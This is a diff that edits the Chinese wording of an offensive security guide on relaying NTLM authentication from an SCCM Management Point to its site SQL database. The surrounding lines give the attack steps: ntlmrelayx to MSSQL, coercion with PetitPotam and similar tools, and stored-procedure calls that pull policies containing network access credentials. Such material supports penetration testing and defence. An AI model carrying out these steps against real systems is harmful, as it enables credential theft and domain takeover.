@@ -9,7 +9,7 @@
 1. 发现 MP 和站点数据库 ↦ 未经身份验证的 HTTP 端点 `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`。
 2. 启动 `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`。
 3. 使用 **PetitPotam**、PrinterBug、DFSCoerce 等强制 MP。
-4. 通过 SOCKS 代理连接 `mssqlclient.py -windows-auth` 作为中继的 **<DOMAIN>\\<MP-host>$** 帐户。
+4. 通过 SOCKS 代理以中继的 **<DOMAIN>\\<MP-host>$** 帐户连接 `mssqlclient.py -windows-auth`。
 5. 执行：
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
@@ -77,7 +77,7 @@ EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''
 * **CollectionSettings** – 可以包含以运行身份的账户
 
 ### 3.3  检索完整主体
-如果您已经拥有 `PolicyID` 和 `PolicyVersion`，则可以使用以下方法跳过 clientID 要求：
+如果您已经拥有 `PolicyID` 和 `PolicyVersion`，可以使用以下方法跳过 clientID 要求：
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
@@ -103,7 +103,7 @@ NetworkAccessPassword: P4ssw0rd123
 ---
 
 ## 5. 相关的 SQL 角色和过程
-在中继时，登录映射到：
+在中继时，登录被映射到：
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
